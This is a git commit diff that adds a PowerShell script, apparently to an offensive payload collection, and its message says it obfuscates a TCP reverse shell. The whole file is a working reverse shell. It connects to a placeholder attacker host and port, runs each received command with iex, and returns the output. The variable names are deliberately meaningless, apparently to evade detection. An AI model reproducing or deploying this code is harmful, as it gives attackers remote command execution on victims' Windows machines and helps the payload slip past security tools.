a7bb6d557011b9c096a8a71cda4d94f1682c4690
dadevel <dadevel@disroot.org>
2022-07-06 10:05:50 +0200

    obfuscate powershell tcp reverse shell

---
+++ reverse/connector/powershell-tcp.ps1
@@ -0,0 +1,13 @@
+# does not support interactive commands
+$aaaa = New-Object System.Net.Sockets.TCPClient("§LHOST§", §LPORT§)
+$bbbb = $aaaa.GetStream()
+[byte[]]$cccc = 0..65535|%{0}
+while (($ffff = $bbbb.Read($cccc, 0, $cccc.Length)) -ne 0) {
+    $gggg = New-Object -TypeName System.Text.ASCIIEncoding
+    $dddd = $gggg.GetString($cccc, 0, $ffff)
+    $hhhh = (iex $dddd 2>&1 | Out-String)
+    $eeee = ([text.encoding]::ASCII).GetBytes($hhhh + "PS " + (pwd).Path + "> ")
+    $bbbb.Write($eeee, 0, $eeee.Length)
+    $bbbb.Flush()
+}
+$aaaa.Close()
